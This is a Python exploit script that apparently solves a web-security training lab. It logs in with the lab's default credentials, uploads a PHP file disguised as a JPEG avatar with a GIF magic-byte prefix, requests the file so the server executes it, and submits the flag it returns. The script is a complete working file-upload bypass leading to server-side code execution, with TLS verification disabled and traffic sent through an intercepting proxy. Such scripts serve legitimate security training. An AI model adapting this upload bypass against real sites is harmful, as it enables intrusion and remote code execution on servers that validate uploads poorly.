import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    token = soup.find("input", {"name": "csrf"})
    if token:
        return token["value"]
    return None

def login(s, url, username, password):
    login_page = url + "/login"
    csrf = get_csrf_token(s, login_page)
    data = {"username": username, "password": password}
    if csrf:
        data["csrf"] = csrf
        r = s.post(login_page, data=data, verify=False, allow_redirects=False, proxies=proxies, timeout=10)
        if r.status_code == 302:
            return True
        return False


def upload_image(s, url): 
    avatar_url = url + "/my-account/avatar"
    account_url = url + "/my-account"
    csrf = get_csrf_token(s, account_url)
    f = {"avatar": ("flag.php", open("flag.php", "rb"), "image/jpeg")}
    data = {"user": "wiener", "csrf": csrf}
    r = s.post(avatar_url, files=f, verify=False, data=data, proxies=proxies)
    if r.status_code != 200:
        print(f"[-] Failed to upload file")
        sys.exit(1)
    print(f'[+] File uploaded') 

def get_flag(s, url):
    flag_url = url + "/files/avatars/flag.php"
    r = s.get(flag_url, verify=False, proxies=proxies)
    flag = r.text.replace("GIF8", "", 1).strip()
    print(f"[+] The lab's flag is: {flag}")
    print("[*] Submitting flag to solve lab...")
    data = {"answer": flag}
    r = s.post(f"{url}/submitSolution", data=data, verify=False, proxies=proxies)
    if '"correct":true' in r.text:
        print(f"[+] Successfully submitted the flag")
    else:
        print(f"[-] Error submitting flag: {r.text}")


def main():
    if len(sys.argv) != 2:
        print(f"[+] Usage: {sys.argv[0]} <URL>")
        sys.exit(0)

    s = requests.Session()
    url = sys.argv[1].strip().rstrip("/")

    if not login(s, url, "wiener", "peter"):
        print("[-] Login failed")
        return False
    print("[+] Logged in as wiener")

    upload_image(s, url)
    get_flag(s, url)

if __name__ == "__main__":
    main()